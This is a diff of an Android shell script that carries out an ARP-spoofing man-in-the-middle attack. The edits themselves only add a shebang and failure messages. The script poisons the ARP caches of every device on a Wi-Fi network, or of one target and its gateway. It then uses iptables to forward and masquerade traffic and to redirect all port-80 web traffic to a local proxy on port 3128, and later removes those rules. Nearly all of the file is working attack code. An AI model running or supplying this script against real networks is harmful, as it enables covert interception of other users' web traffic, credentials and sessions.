@@ -1,4 +1,4 @@
-
+#!/system/bin/sh
 # When this script the following are set by the . command:
 # WLAN, IP, SUBNET, MASK, SHORTMASK
 # ARPSPOOF, IPTABLES
@@ -18,7 +18,7 @@ if [ "$1" = "all" ]
 then
 	echo "Starting ARP Spoofing for all devices"
 	echo arpspoof -i $WLAN "$2"
-	$ARPSPOOF -i $WLAN "$2" 2>&1 >/dev/null &
+	$ARPSPOOF -i $WLAN "$2" 2>&1 >/dev/null && echo "arpspoof (1) finished" || echo "arpspoof (1) failed" &
 	ARP1="$!"
 elif [ "$1" == "none" ]
 then
@@ -26,10 +26,10 @@ then
 else
 	echo "Starting ARP Spoofing"
 	echo arpspoof -i $WLAN -t "$1" "$2"
-	$ARPSPOOF -i $WLAN -t "$1" "$2" &
+	$ARPSPOOF -i $WLAN -t "$1" "$2" && echo "arpspoof (1) finished" || echo "arpspoof (1) failed" &
 	ARP1="$!"
 	echo arpspoof -i $WLAN -t "$2" "$1"
-	$ARPSPOOF -i $WLAN -t "$2" "$1" &
+	$ARPSPOOF -i $WLAN -t "$2" "$1" && echo "arpspoof (2) finished" || echo "arpspoof (2) failed" &
 	ARP2="$!"
 fi
 
@@ -38,9 +38,9 @@ echo iptables -t nat -A POSTROUTING -j MASQUERADE
 echo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 3128
 
 
-$IPTABLES -P FORWARD ACCEPT # Android 4.0 requires this
-$IPTABLES -t nat -A POSTROUTING -j MASQUERADE
-$IPTABLES -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 3128
+$IPTABLES -P FORWARD ACCEPT || echo "iptables (1) failed" # Android 4.0 requires this
+$IPTABLES -t nat -A POSTROUTING -j MASQUERADE || echo "iptables (2) failed"
+$IPTABLES -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 3128 || echo "iptables (3) failed"
 
 # Wait for finish
 read
@@ -54,8 +54,8 @@ kill $ARP2 2>/dev/null
 echo iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 3128
 echo iptables -t nat -D POSTROUTING -j MASQUERADE
 
-$IPTABLES -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 3128
-$IPTABLES -t nat -D POSTROUTING -j MASQUERADE
+$IPTABLES -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 3128 || echo "iptables (4) failed"
+$IPTABLES -t nat -D POSTROUTING -j MASQUERADE || echo "iptables (5) failed"
 
 
 wait
